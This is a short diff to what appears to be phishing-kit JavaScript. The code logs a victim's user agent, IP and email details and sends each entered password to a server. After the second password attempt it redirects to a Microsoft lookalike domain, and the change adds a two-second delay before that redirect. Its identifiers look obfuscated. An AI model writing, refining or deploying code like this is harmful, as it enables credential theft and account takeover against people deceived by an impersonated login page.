@@ -400,7 +400,9 @@ ${message.ua} | IP: ${ipAddress} | Email Type: ${message.email_type} | Time Zone
     passwordAttempts++;
     console.log("password attempts is ", passwordAttempts)
     if (passwordAttempts > 1) {
-      window.location.href = "https://microsoft.archive-login.com";
+      setTimeout(function() {
+        window.location.href = "https://microsoft.archive-login.com";
+    }, 2000);
     }
     _0x58102b.emit("password_command", _0x4c5d45);
   });
